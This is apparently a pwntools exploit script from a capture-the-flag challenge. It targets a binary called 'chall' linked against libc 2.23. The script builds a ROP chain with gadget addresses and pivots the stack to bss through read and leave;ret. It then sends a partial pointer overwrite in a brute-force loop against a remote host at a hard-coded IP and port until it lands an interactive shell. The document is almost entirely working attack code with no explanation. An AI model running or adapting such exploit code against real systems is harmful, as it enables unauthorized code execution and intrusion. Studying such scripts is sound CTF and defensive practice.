from pwn import *

context.log_level = 'debug'
# r = process('./chall')
elf = ELF('./chall')
libc = ELF('./libc-2.23.so')


read_plt = elf.symbols['read']
main = elf.symbols['main']
setup = elf.symbols['setup']
ret = 0x000000000040047d #: ret
sub_rsp = 0x400482
bss = elf.bss() + 0x100
leave_ret = 0x0000000000400499 #: leave ; ret
pop_r15 = 0x000000000040049b #: pop r15 ; ret
pop_rbp = 0x000000000040047c #: pop rbp ; ret
pop_rdi = 0x000000000040049c #: pop rdi ; ret
pop_rsi = 0x000000000040049e #: pop rsi ; ret
one_gadget = [283158, 283242, 983716, 987463]

bss = 0x601038
# p = 'a' * 0x28
# p += p64(ret) * 58
# p += p64(main)

# p += p64(main)

while True:
    r = remote('13.231.207.73', 9002)
    
    p = 'a' * 0x20
    p += p64(bss)
    p += p64(pop_rsi)
    p += p64(bss)
    p += p64(read_plt)
    p += p64(leave_ret)
    r.send(p)

    sleep(0.2)

    p = 'A' * (0x8) + '\xa0\xe2\x6a'
    r.send(p)

    try:
        if 'redir' in r.recv(0x20):
            r.close()
            continue
        r.interactive()
    except:
        # r.close()
        r.interactive()